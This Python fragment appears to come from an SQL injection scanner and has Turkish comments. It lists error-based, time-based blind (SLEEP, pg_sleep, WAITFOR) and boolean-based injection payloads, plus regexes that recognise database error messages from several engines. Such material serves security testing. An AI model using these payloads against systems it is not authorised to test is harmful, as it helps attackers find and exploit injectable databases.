ERROR_BASED_PAYLOADS = [
    "'",
    '"',
    "''",
    "';",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
]

ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that (corresponds to|fits) your MySQL server version",
    r"ORA-\d{5}",           # Oracle
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*oci_",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark after the character string",
    r"\[SQL Server\]",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver",
    r"macromates\.com.*SQL",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError:",
    r"org\.postgresql\.util\.PSQLException",
    r"ERROR:\s+syntax error at or near",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_",
    r"Warning.*SQLite3::",
    r"\[SQLITE_ERROR\]",
]

# Time-based blind: veritabanını kasıtlı olarak yavaşlatır
# MySQL SLEEP, PostgreSQL pg_sleep, MSSQL WAITFOR kullanır
TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; WAITFOR DELAY '0:0:5'--",              # MSSQL
    "' OR pg_sleep(5)--",                       # PostgreSQL
    "' AND 1=1 AND SLEEP(5)--",
]

# Boolean-based blind: iki farklı payload'un response'u farklıysa zafiyet var
# Her çift: (true condition, false condition)
BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR 'a'='a", "' OR 'a'='b"),
    ("\" AND 1=1--", "\" AND 1=2--"),
]
